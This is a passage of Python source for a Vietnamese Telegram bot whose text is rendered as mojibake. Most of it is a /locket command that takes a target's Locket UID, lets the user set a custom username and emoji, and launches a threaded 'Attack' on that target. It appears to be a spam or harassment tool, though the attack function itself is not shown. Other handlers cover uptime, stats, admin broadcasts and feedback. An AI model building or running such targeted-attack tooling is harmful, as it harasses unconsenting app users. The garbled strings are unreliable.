    config.messages = [] # X√≥a th√¥ng b√°o l·ªói c≈©
    uid = config._extract_uid_locket(url_to_check)

    if uid:
        user_states[user_id]["target"] = uid
        keyboard = InlineKeyboardMarkup()
        keyboard.row(
            InlineKeyboardButton("B·∫≠t Emoji", callback_data=f"emoji_on_{user_id}"),
            InlineKeyboardButton("T·∫Øt Emoji", callback_data=f"emoji_off_{user_id}")
        )
        keyboard.add(InlineKeyboardButton("X√°c nh·∫≠n ch·∫°y Attack", callback_data=f"confirm_attack_{user_id}"))

        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                              text=f"‚úÖ T√¨m th·∫•y Locket UID: <code>{uid}</code>\n"
                                   f"Username m·∫∑c ƒë·ªãnh: <b>CTLocket Tool Pro</b>\n"
                                   f"Emoji hi·ªán ƒëang: <b>B·∫¨T</b>\n\n"
                                   f"B·∫°n mu·ªën t√πy ch·ªânh g√¨ kh√¥ng?",
                              reply_markup=keyboard, parse_mode='HTML')
    else:
        error_message = "‚ùå Kh√¥ng t√¨m th·∫•y Locket UID ho·∫∑c link kh√¥ng h·ª£p l·ªá.\n"
        if config.messages:
            error_message += "\n".join([f"‚Ä¢ {msg}" for msg in config.messages])
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=error_message, parse_mode='HTML')
        if user_id in user_states:
            del user_states[user_id] # X√≥a tr·∫°ng th√°i n·∫øu kh√¥ng t√¨m th·∫•y UID

@bot.callback_query_handler(func=lambda call: call.data.startswith('emoji_'))
def handle_emoji_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phi√™n l√†m vi·ªác n√†y ƒë√£ h·∫øt h·∫°n ho·∫∑c kh√¥ng h·ª£p l·ªá.")
        return

    action = call.data.split('_')[1] # 'on' or 'off'

    if action == 'on':
        user_states[user_id]["use_emoji"] = True
    elif action == 'off':
        user_states[user_id]["use_emoji"] = False
    
    uid = user_states[user_id]["target"]
    username_custom = user_states[user_id]["username_custom"]
    emoji_status = "B·∫¨T" if user_states[user_id]["use_emoji"] else "T·∫ÆT"

    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("B·∫≠t Emoji", callback_data=f"emoji_on_{user_id}"),
        InlineKeyboardButton("T·∫Øt Emoji", callback_data=f"emoji_off_{user_id}")
    )
    keyboard.add(InlineKeyboardButton("X√°c nh·∫≠n ch·∫°y Attack", callback_data=f"confirm_attack_{user_id}"))

    bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                          text=f"‚úÖ T√¨m th·∫•y Locket UID: <code>{uid}</code>\n"
                               f"Username m·∫∑c ƒë·ªãnh: <b>{username_custom}</b>\n"
                               f"Emoji hi·ªán ƒëang: <b>{emoji_status}</b>\n\n"
                               f"B·∫°n mu·ªën t√πy ch·ªânh g√¨ kh√¥ng?",
                          reply_markup=keyboard, parse_mode='HTML')
    bot.answer_callback_query(call.id, f"ƒê√£ {emoji_status} Emoji.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_attack_'))
def handle_confirm_attack_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phi√™n l√†m vi·ªác n√†y ƒë√£ h·∫øt h·∫°n ho·∫∑c kh√¥ng h·ª£p l·ªá.")
        return

    target_uid = user_states[user_id]["target"]
    username_custom = user_states[user_id]["username_custom"]
    use_emoji = user_states[user_id]["use_emoji"]
    
    if not target_uid:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                              text="‚ùå L·ªói: Kh√¥ng t√¨m th·∫•y Target UID. Vui l√≤ng th·ª≠ l·∫°i l·ªánh /locket.", parse_mode='HTML')
        bot.answer_callback_query(call.id, "L·ªói Target UID.")
        if user_id in user_states:
            del user_states[user_id]
        return

    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("ƒê√∫ng, x√°c nh·∫≠n Attack", callback_data=f"start_attack_{user_id}"),
        InlineKeyboardButton("Kh√¥ng, h·ªßy b·ªè", callback_data=f"cancel_attack_{user_id}")
    )
    
    bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                          text=f"B·∫°n c√≥ ch·∫Øc ch·∫Øn mu·ªën b·∫Øt ƒë·∫ßu t·∫•n c√¥ng Locket v·ªõi c√°c th√¥ng tin sau kh√¥ng?\n\n"
                               f"Target UID: <code>{target_uid}</code>\n"
                               f"Username t√πy ch·ªânh: <b>{username_custom}</b>\n"
                               f"S·ª≠ d·ª•ng Emoji: <b>{'C√ì' if use_emoji else 'KH√îNG'}</b>",
                          reply_markup=keyboard, parse_mode='HTML')
    bot.answer_callback_query(call.id, "X√°c nh·∫≠n Attack?")

@bot.callback_query_handler(func=lambda call: call.data.startswith('start_attack_'))
def handle_start_attack_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phi√™n l√†m vi·ªác n√†y ƒë√£ h·∫øt h·∫°n ho·∫∑c kh√¥ng h·ª£p l·ªá.")
        return

    target_uid = user_states[user_id]["target"]
    username_custom = user_states[user_id]["username_custom"]
    use_emoji = user_states[user_id]["use_emoji"]

    if not target_uid:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                              text="‚ùå L·ªói: Kh√¥ng t√¨m th·∫•y Target UID. Vui l√≤ng th·ª≠ l·∫°i l·ªánh /locket.", parse_mode='HTML')
        bot.answer_callback_query(call.id, "L·ªói Target UID.")
        if user_id in user_states:
            del user_states[user_id]
        return

    # Set cooldown for this user
    last_command_time[user_id] = time.time()

    # B·∫Øt ƒë·∫ßu lu·ªìng t·∫•n c√¥ng ch√≠nh
    bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                          text="‚è≥Ô∏è ƒêang kh·ªüi t·∫°o Attack, vui l√≤ng ch·ªù...", parse_mode='HTML')
    threading.Thread(target=run_locket_attack, args=(chat_id, user_id, message_id, target_uid, username_custom, use_emoji)).start()
    bot.answer_callback_query(call.id, "B·∫Øt ƒë·∫ßu Attack!")
    
    # X√≥a tr·∫°ng th√°i sau khi b·∫Øt ƒë·∫ßu t·∫•n c√¥ng (ƒë·ªÉ tr√°nh l·ªói khi ng∆∞·ªùi d√πng ·∫•n l·∫°i c√°c n√∫t c≈©)
    if user_id in user_states:
        del user_states[user_id]


@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_attack_'))
def handle_cancel_attack_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if user_id not in user_states or user_states[user_id]["message_id"] != message_id:
        bot.answer_callback_query(call.id, "Phi√™n l√†m vi·ªác n√†y ƒë√£ h·∫øt h·∫°n ho·∫∑c kh√¥ng h·ª£p l·ªá.")
        return

    bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                          text="ƒê√£ h·ªßy b·ªè Attack.", parse_mode='HTML')
    bot.answer_callback_query(call.id, "ƒê√£ h·ªßy.")
    if user_id in user_states:
        del user_states[user_id]


@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # N·∫øu ng∆∞·ªùi d√πng ƒë√£ ·ªü trong m·ªôt lu·ªìng x·ª≠ l√Ω l·ªánh v√† ƒëang ch·ªù username custom
    if user_id in user_states and user_states[user_id].get("command") == "locket" and user_states[user_id].get("target"):
        # C·∫≠p nh·∫≠t username_custom v√† chuy·ªÉn sang b∆∞·ªõc x√°c nh·∫≠n cu·ªëi c√πng
        new_username = message.text.strip()
        if 1 <= len(new_username) <= 20:
            user_states[user_id]["username_custom"] = new_username
            uid = user_states[user_id]["target"]
            use_emoji = user_states[user_id]["use_emoji"]
            emoji_status = "B·∫¨T" if use_emoji else "T·∫ÆT"

            keyboard = InlineKeyboardMarkup()
            keyboard.row(
                InlineKeyboardButton("B·∫≠t Emoji", callback_data=f"emoji_on_{user_id}"),
                InlineKeyboardButton("T·∫Øt Emoji", callback_data=f"emoji_off_{user_id}")
            )
            keyboard.add(InlineKeyboardButton("X√°c nh·∫≠n ch·∫°y Attack", callback_data=f"confirm_attack_{user_id}"))

            bot.edit_message_text(chat_id=chat_id, message_id=user_states[user_id]["message_id"],
                                  text=f"‚úÖ T√¨m th·∫•y Locket UID: <code>{uid}</code>\n"
                                       f"Username t√πy ch·ªânh: <b>{new_username}</b>\n"
                                       f"Emoji hi·ªán ƒëang: <b>{emoji_status}</b>\n\n"
                                       f"B·∫°n mu·ªën t√πy ch·ªânh g√¨ kh√¥ng?",
                                  reply_markup=keyboard, parse_mode='HTML')
            # X√≥a tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng ƒë·ªÉ gi·ªØ s·∫°ch chat
            bot.delete_message(chat_id, message.message_id)
        else:
            bot.send_message(chat_id, "Username qu√° d√†i ho·∫∑c qu√° ng·∫Øn (1-20 k√Ω t·ª±). Vui l√≤ng g·ª≠i l·∫°i.", 
                             reply_to_message_id=message.message_id)
    else:
        # N·∫øu kh√¥ng ph·∫£i l·ªánh ƒëang ƒë∆∞·ª£c x·ª≠ l√Ω, bot b·ªè qua ho·∫∑c ph·∫£n h·ªìi m·∫∑c ƒë·ªãnh
        bot.reply_to(message, "T√¥i kh√¥ng hi·ªÉu l·ªánh n√†y. Vui l√≤ng s·ª≠ d·ª•ng l·ªánh /locket ƒë·ªÉ b·∫Øt ƒë·∫ßu.")

@bot.message_handler(commands=["time"])
@increment_interaction_count
def time_cmd(message):
    """X·ª≠ l√Ω l·ªánh /time, hi·ªÉn th·ªã th·ªùi gian ho·∫°t ƒë·ªông c·ªßa bot."""
    logging.info(f"Received /time from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    now = time.time()
    seconds = int(now - START_TIME)
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    sec = seconds % 60
    send_message_robustly(
        message.chat.id,
        text=f"<blockquote>‚è±Ô∏è Bot ƒë√£ ho·∫°t ƒë·ªông ƒë∆∞·ª£c:\n<b>{days} ng√†y {hours} gi·ªù {minutes} ph√∫t {sec} gi√¢y</b></blockquote>",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=["tuongtac"])
@increment_interaction_count
def tuongtac_command(message):
    """X·ª≠ l√Ω l·ªánh /tuongtac, hi·ªÉn th·ªã t·ªïng s·ªë l∆∞·ª£t t∆∞∆°ng t√°c c·ªßa bot."""
    logging.info(f"Received /tuongtac from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    
    with interaction_count_lock: # ƒê·ªçc bi·∫øn ƒë∆∞·ª£c b·∫£o v·ªá
        current_interaction_count = interaction_count

    reply_text = (
        f"<b>üìä TH·ªêNG K√ä ZPROJECT BOT</b>\n\n"
        f"‚óè T·ªïng Th·ªëng K√™ Zproject Bot.\n\n"
        f"<b>T·ªïng s·ªë l∆∞·ª£t t∆∞∆°ng t√°c:</b> <code>{current_interaction_count}</code>\n"
        f"<i>L∆∞u √Ω: S·ªë L∆∞·ª£t T∆∞∆°ng T√°c C√†ng Cao Ch·ª©ng T·ªè ƒê·ªô Uy T√≠n C·ªßa Bot üéâ.</i>"
    )
    
    send_message_robustly(
        chat_id=message.chat.id,
        photo=TUONGTAC_IMAGE_URL,
        caption=reply_text,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )
# Th√™m v√†o ph·∫ßn Bi·∫øn to√†n c·ª•c v√† c√°c Lock
# ... (gi·ªØ nguy√™n c√°c lock c≈©) ...
noti_states_lock = threading.Lock() # Th√™m lock m·ªõi cho bot.noti_states
bot.noti_states = {} # L∆∞u tr·∫°ng th√°i t·∫°o th√¥ng b√°o c·ªßa admin

# ... (c√°c h√†m kh√°c) ...

@bot.message_handler(commands=["noti"])
@increment_interaction_count
def send_noti(message):
    """X·ª≠ l√Ω l·ªánh /noti, cho ph√©p Admin g·ª≠i th√¥ng b√°o k√®m ·∫£nh (t√πy ch·ªçn) t·ªõi t·∫•t c·∫£ ng∆∞·ªùi d√πng/nh√≥m."""
    logging.info(f"Received /noti from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.", parse_mode="HTML", reply_to_message_id=message.message_id)

    text = message.text.replace("/noti", "").strip()

    photo_file_id = None
    if message.reply_to_message and message.reply_to_message.photo:
        photo_file_id = message.reply_to_message.photo[-1].file_id

    if not text and not photo_file_id:
        return send_message_robustly(message.chat.id, text="‚ö†Ô∏è S·ª≠ d·ª•ng: <code>/noti &lt;n·ªôi dung&gt;</code> ho·∫∑c reply v√†o ·∫£nh v√† d√πng <code>/noti &lt;n·ªôi dung&gt;</code>.", parse_mode="HTML", reply_to_message_id=message.message_id)

    notify_caption = f"<b>[!] TH√îNG B√ÅO T·ª™ ADMIN DEPZAI CUTO</b>\n\n{text}\n\n<i>G·ª≠i B·ªüi Admin @Zproject2</i>" if text else "<b>[!] TH√îNG B√ÅO</b>"

    with noti_states_lock: # B·∫£o v·ªá truy c·∫≠p bot.noti_states
        bot.noti_states[message.chat.id] = {
            'caption': notify_caption,
            'photo_file_id': photo_file_id,
            'original_message_id': message.message_id, # L∆∞u ID tin nh·∫Øn g·ªëc ƒë·ªÉ reply
            'button_text': None,
            'button_url': None
        }

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("‚úÖ C√≥", callback_data="noti_add_button|yes"),
        InlineKeyboardButton("‚ùå Kh√¥ng", callback_data="noti_add_button|no")
    )

    send_message_robustly(
        message.chat.id,
        text="B·∫°n c√≥ mu·ªën th√™m n√∫t (button) v√†o th√¥ng b√°o n√†y kh√¥ng?",
        reply_markup=markup,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("noti_add_button|"))
def noti_add_button(call):
    """X·ª≠ l√Ω vi·ªác admin ch·ªçn th√™m n√∫t v√†o th√¥ng b√°o."""
    user_id = call.message.chat.id
    
    # ƒê·∫£m b·∫£o ch·ªâ admin m·ªõi c√≥ th·ªÉ d√πng n√∫t n√†y
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng n√∫t n√†y.", show_alert=True)
        return

    _, choice = call.data.split("|")

    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        bot.answer_callback_query(call.id, "ƒê√£ x·∫£y ra l·ªói ho·∫∑c phi√™n l√†m vi·ªác ƒë√£ h·∫øt. Vui l√≤ng th·ª≠ l·∫°i l·ªánh /noti.", show_alert=True)
        return

    if choice == "yes":
        bot.answer_callback_query(call.id, "B·∫°n ƒë√£ ch·ªçn th√™m n√∫t.", show_alert=False)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Tuy·ªát v·ªùi! H√£y g·ª≠i cho t√¥i **t√™n c·ªßa n√∫t** b·∫°n mu·ªën hi·ªÉn th·ªã (v√≠ d·ª•: `Tham gia nh√≥m`).",
            parse_mode="HTML"
        )
        # ƒê·∫∑t b∆∞·ªõc ti·∫øp theo l√† ch·ªù t√™n n√∫t
        bot.register_next_step_handler(call.message, process_button_text)
    else: # choice == "no"
        bot.answer_callback_query(call.id, "B·∫°n ƒë√£ ch·ªçn kh√¥ng th√™m n√∫t.", show_alert=False)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="ƒêang g·ª≠i th√¥ng b√°o...",
            parse_mode="HTML"
        )
        # G·ª≠i th√¥ng b√°o ngay l·∫≠p t·ª©c
        send_final_notification(user_id)


def process_button_text(message):
    """X·ª≠ l√Ω t√™n n√∫t ƒë∆∞·ª£c admin g·ª≠i."""
    user_id = message.chat.id
    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        send_message_robustly(user_id, "ƒê√£ x·∫£y ra l·ªói ho·∫∑c phi√™n l√†m vi·ªác ƒë√£ h·∫øt. Vui l√≤ng th·ª≠ l·∫°i l·ªánh /noti.", parse_mode="HTML")
        return

    button_text = message.text.strip()
    if not button_text:
        send_message_robustly(user_id, "‚ö†Ô∏è T√™n n√∫t kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng. Vui l√≤ng g·ª≠i l·∫°i t√™n n√∫t.", parse_mode="HTML", reply_to_message_id=message.message_id)
        bot.register_next_step_handler(message, process_button_text)
        return

    with noti_states_lock:
        noti_info['button_text'] = button_text
        bot.noti_states[user_id] = noti_info # C·∫≠p nh·∫≠t l·∫°i state

    send_message_robustly(
        user_id,
        f"ƒê√£ l∆∞u t√™n n√∫t: <b>{html_escape(button_text)}</b>. B√¢y gi·ªù h√£y g·ª≠i cho t√¥i **URL** m√† n√∫t s·∫Ω d·∫´n ƒë·∫øn (v√≠ d·ª•: `https://t.me/zproject3`).",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )
    # ƒê·∫∑t b∆∞·ªõc ti·∫øp theo l√† ch·ªù URL
    bot.register_next_step_handler(message, process_button_url)


def process_button_url(message):
    """X·ª≠ l√Ω URL c·ªßa n√∫t ƒë∆∞·ª£c admin g·ª≠i v√† g·ª≠i th√¥ng b√°o cu·ªëi c√πng."""
    user_id = message.chat.id
    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        send_message_robustly(user_id, "ƒê√£ x·∫£y ra l·ªói ho·∫∑c phi√™n l√†m vi·ªác ƒë√£ h·∫øt. Vui l√≤ng th·ª≠ l·∫°i l·ªánh /noti.", parse_mode="HTML")
        return

    button_url = message.text.strip()
    if not button_url or not (button_url.startswith("http://") or button_url.startswith("https://")):
        send_message_robustly(user_id, "‚ö†Ô∏è URL kh√¥ng h·ª£p l·ªá. Vui l√≤ng g·ª≠i l·∫°i m·ªôt URL ƒë·∫ßy ƒë·ªß (v√≠ d·ª•: `https://t.me/zproject3`).", parse_mode="HTML", reply_to_message_id=message.message_id)
        bot.register_next_step_handler(message, process_button_url)
        return

    with noti_states_lock:
        noti_info['button_url'] = button_url
        bot.noti_states[user_id] = noti_info # C·∫≠p nh·∫≠t l·∫°i state

    send_message_robustly(
        user_id,
        "ƒê√£ l∆∞u URL. ƒêang ti·∫øn h√†nh g·ª≠i th√¥ng b√°o...",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

    send_final_notification(user_id)


def send_final_notification(admin_id):
    """H√†m th·ª±c hi·ªán g·ª≠i th√¥ng b√°o cu·ªëi c√πng t·ªõi t·∫•t c·∫£ ng∆∞·ªùi nh·∫≠n."""
    with noti_states_lock:
        noti_info = bot.noti_states.pop(admin_id, None) # L·∫•y v√† x√≥a state

    if not noti_info:
        send_message_robustly(admin_id, "ƒê√£ x·∫£y ra l·ªói khi g·ª≠i th√¥ng b√°o. Th√¥ng tin kh√¥ng t·ªìn t·∫°i.", parse_mode="HTML")
        return

    notify_caption = noti_info['caption']
    photo_file_id = noti_info['photo_file_id']
    button_text = noti_info['button_text']
    button_url = noti_info['button_url']
    original_message_id = noti_info['original_message_id']

    markup = None
    if button_text and button_url:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(button_text, url=button_url))

    ok_users_count, ok_groups_count = 0, 0
    failed_count = 0
    failed_details = [] # L∆∞u chi ti·∫øt l·ªói (ID, username/title, l·ªói)
    
    with user_group_info_lock: # ƒê·ªçc bi·∫øn ƒë∆∞·ª£c b·∫£o v·ªá
        all_users = list(USER_IDS)
        all_groups = list(GROUP_INFOS)

    # G·ª≠i t·ªõi t·∫•t c·∫£ ng∆∞·ªùi d√πng
    for uid in all_users:
        try:
            if photo_file_id:
                bot.send_photo(
                    chat_id=uid,
                    photo=photo_file_id,
                    caption=notify_caption,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            else:
                bot.send_message(
                    chat_id=uid,
                    text=notify_caption,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=markup
                )
            ok_users_count += 1
            time.sleep(0.1)
        except Exception as e:
            failed_count += 1
            failed_details.append(f"Ng∆∞·ªùi d√πng ID: <code>{uid}</code> (L·ªói: {html_escape(str(e))})")
            logging.error(f"Failed to send notification to user {uid}: {e}")

    # G·ª≠i t·ªõi t·∫•t c·∫£ nh√≥m
    for group in all_groups:
        group_id = group["id"]
        group_title = group.get("title", "Kh√¥ng r√µ t√™n nh√≥m")
        group_username = group.get("username", "") # C√≥ th·ªÉ kh√¥ng c√≥ username
        
        try:
            if photo_file_id:
                bot.send_photo(
                    chat_id=group_id,
                    photo=photo_file_id,
                    caption=notify_caption,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            else:
                bot.send_message(
                    chat_id=group_id,
                    text=notify_caption,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=markup
                )
            ok_groups_count += 1
            time.sleep(0.1)
        except Exception as e:
            failed_count += 1
            group_display = f"{group_title} (ID: <code>{group_id}</code>)"
            if group_username:
                group_display += f" (@{group_username})"
            failed_details.append(f"Nh√≥m: {group_display} (L·ªói: {html_escape(str(e))})")
            logging.error(f"Failed to send notification to group {group_id}: {e}")

    total_sent = ok_users_count + ok_groups_count
    
    result_text = (
        f"‚úÖ G·ª≠i th√†nh c√¥ng: {total_sent} tin nh·∫Øn (ƒê·∫øn <b>{ok_users_count}</b> ng∆∞·ªùi d√πng v√† <b>{ok_groups_count}</b> nh√≥m).\n"
        f"‚ùå G·ª≠i th·∫•t b·∫°i: {failed_count} tin nh·∫Øn.\n\n"
    )

    if failed_count > 0:
        result_text += "<b>‚ö†Ô∏è Chi ti·∫øt th·∫•t b·∫°i:</b>\n"
        for detail in failed_details:
            result_text += f"- {detail}\n"
    else:
        result_text += "üéâ T·∫•t c·∫£ th√¥ng b√°o ƒë√£ ƒë∆∞·ª£c g·ª≠i th√†nh c√¥ng!"

    send_message_robustly(
        admin_id,
        text=result_text,
        parse_mode="HTML",
        reply_to_message_id=original_message_id # Reply v·ªÅ tin nh·∫Øn /noti g·ªëc
    )


@bot.message_handler(commands=["phanhoi"])
@increment_interaction_count
def send_feedback_to_admin(message):
    """X·ª≠ l√Ω l·ªánh /phanhoi, cho ph√©p ng∆∞·ªùi d√πng g·ª≠i ph·∫£n h·ªìi ƒë·∫øn admin."""
    logging.info(f"Received /phanhoi from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    sync_chat_to_server(message.chat)
    feedback_text = message.text.replace("/phanhoi", "").strip()

    if not feedback_text:
        return send_message_robustly(message.chat.id, text="‚ö†Ô∏è Vui l√≤ng nh·∫≠p n·ªôi dung ph·∫£n h·ªìi. V√≠ d·ª•: <code>/phanhoi Bot b·ªã l·ªói ·ªü l·ªánh /ask</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_info_for_admin = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    if message.from_user.last_name:
        user_info_for_admin += f" {message.from_user.last_name}"
    if message.from_user.username:
        user_info_for_admin += f" (@{message.from_user.username})"
    user_info_for_admin += f" (<code>{message.from_user.id}</code>)"

    chat_info_for_admin = f"ID Chat: <code>{message.chat.id}</code>\n" \
                          f"Lo·∫°i Chat: {message.chat.type}"
    if message.chat.type in ["group", "supergroup"]:
        chat_info_for_admin += f"\nT√™n Chat: {message.chat.title}"

    timestamp = datetime.now().strftime("%H:%M:%S ng√†y %d/%m/%Y")

    admin_notification = (
        f"<b>üìß PH·∫¢N H·ªíI M·ªöI T·ª™ NG∆Ø·ªúI D√ôNG</b>\n\n"
        f"<b>Ng∆∞·ªùi g·ª≠i:</b>\n{user_info_for_admin}\n"
        f"<b>Th√¥ng tin Chat:</b>\n{chat_info_for_admin}\n"
        f"<b>Th·ªùi gian:</b> <code>{timestamp}</code>\n\n"
        f"<b>N·ªôi dung ph·∫£n h·ªìi:</b>\n<blockquote>{html_escape(feedback_text)}</blockquote>\n\n"
        f"<i>ƒê·ªÉ ph·∫£n h·ªìi l·∫°i ng∆∞·ªùi d√πng n√†y, h√£y reply tin nh·∫Øn n√†y v√† d√πng l·ªánh <code>/adminph &lt;n·ªôi dung ph·∫£n h·ªìi&gt;</code></i>"
    )

    try:
        sent_message_to_admin = bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_notification,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        with feedback_messages_lock: # B·∫£o v·ªá truy c·∫≠p bot.feedback_messages
            bot.feedback_messages[sent_message_to_admin.message_id] = {
                'chat_id': message.chat.id,
                'user_id': message.from_user.id,
                'user_first_name': message.from_user.first_name,
                'feedback_text': feedback_text
            }
        
        send_message_robustly(message.chat.id, text="‚úÖ C·∫£m ∆°n b·∫°n ƒë√£ g·ª≠i ph·∫£n h·ªìi! Admin s·∫Ω xem x√©t s·ªõm nh·∫•t c√≥ th·ªÉ.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"L·ªói khi g·ª≠i ph·∫£n h·ªìi ƒë·∫øn admin: {e}")
        send_message_robustly(message.chat.id, text="‚ùå ƒê√£ x·∫£y ra l·ªói khi g·ª≠i ph·∫£n h·ªìi. Vui l√≤ng th·ª≠ l·∫°i sau.", parse_mode="HTML", reply_to_message_id=message.message_id)

@bot.message_handler(commands=["adminph"])
@increment_interaction_count
def admin_reply_to_feedback(message):
    """X·ª≠ l√Ω l·ªánh /adminph, cho ph√©p admin ph·∫£n h·ªìi l·∫°i ng∆∞·ªùi d√πng ƒë√£ g·ª≠i feedback."""
    logging.info(f"Received /adminph from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="üö´ B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.", parse_mode="HTML", reply_to_message_id=message.message_id)

    if not message.reply_to_message:
        return send_message_robustly(message.chat.id, text="‚ö†Ô∏è B·∫°n c·∫ßn reply v√†o tin nh·∫Øn ph·∫£n h·ªìi c·ªßa ng∆∞·ªùi d√πng ƒë·ªÉ s·ª≠ d·ª•ng l·ªánh n√†y.", parse_mode="HTML", reply_to_message_id=message.message_id)

    original_feedback_message_id = message.reply_to_message.message_id
    with feedback_messages_lock: # B·∫£o v·ªá truy c·∫≠p bot.feedback_messages
        feedback_data = bot.feedback_messages.get(original_feedback_message_id)

    if not feedback_data:
        return send_message_robustly(message.chat.id, text="‚ùå Kh√¥ng t√¨m th·∫•y th√¥ng tin chat c·ªßa ng∆∞·ªùi d√πng n√†y. C√≥ th·ªÉ tin nh·∫Øn qu√° c≈© ho·∫∑c bot ƒë√£ kh·ªüi ƒë·ªông l·∫°i.", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_chat_id = feedback_data['chat_id']
    user_id_to_tag = feedback_data['user_id']
    user_name_to_tag = feedback_data['user_first_name']
    original_feedback_text = feedback_data['feedback_text']

    admin_response_text = message.text.replace("/adminph", "").strip()

    if not admin_response_text:
        return send_message_robustly(message.chat.id, text="‚ö†Ô∏è Vui l√≤ng nh·∫≠p n·ªôi dung ph·∫£n h·ªìi c·ªßa admin. V√≠ d·ª•: <code>/adminph C·∫£m ∆°n b·∫°n, ch√∫ng t√¥i ƒë√£ kh·∫Øc ph·ª•c l·ªói.</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_tag = f"<a href='tg://user?id={user_id_to_tag}'>{user_name_to_tag}</a>"

    admin_reply_to_user = (
        f"<b>üë®‚Äçüíª Admin ƒë√£ ph·∫£n h·ªìi b·∫°n {user_tag}!</b>\n\n"
        f"<b>N·ªôi dung ph·∫£n h·ªìi c·ªßa b·∫°n:</b>\n"
        f"<blockquote>{html_escape(original_feedback_text)}</blockquote>\n\n"
        f"<b>Ph·∫£n h·ªìi t·ª´ Admin:</b>\n"
        f"<blockquote>{html_escape(admin_response_text)}</blockquote>\n\n"
        f"<i>N·∫øu b·∫°n c√≥ th√™m c√¢u h·ªèi, vui l√≤ng g·ª≠i ph·∫£n h·ªìi m·ªõi qua l·ªánh <code>/phanhoi</code>.</i>"
    )

    try:
        bot.send_message(
            chat_id=user_chat_id,
            text=admin_reply_to_user,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        send_message_robustly(message.chat.id, text="‚úÖ ƒê√£ g·ª≠i ph·∫£n h·ªìi c·ªßa Admin ƒë·∫øn ng∆∞·ªùi d√πng th√†nh c√¥ng.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"L·ªói khi g·ª≠i ph·∫£n h·ªìi c·ªßa admin ƒë·∫øn ng∆∞·ªùi d√πng {user_chat_id}: {e}")
        send_message_robustly(message.chat.id, text="‚ùå ƒê√£ x·∫£y ra l·ªói khi g·ª≠i ph·∫£n h·ªìi c·ªßa Admin ƒë·∫øn ng∆∞·ªùi d√πng.", parse_mode="HTML", reply_to_message_id=message.message_id)


@bot.message_handler(commands=["sever"])
@increment_interaction_count
def show_groups(message):
    """X·ª≠ l√Ω l·ªánh /sever, hi·ªÉn th·ªã danh s√°ch c√°c nh√≥m bot ƒëang tham gia (ch·ªâ Admin)."""
    logging.info(f"Received /sever from user {message.from_user.id} in chat {message.chat.id}") # Th√™m log
    if message.from_user.id != ADMIN_ID:
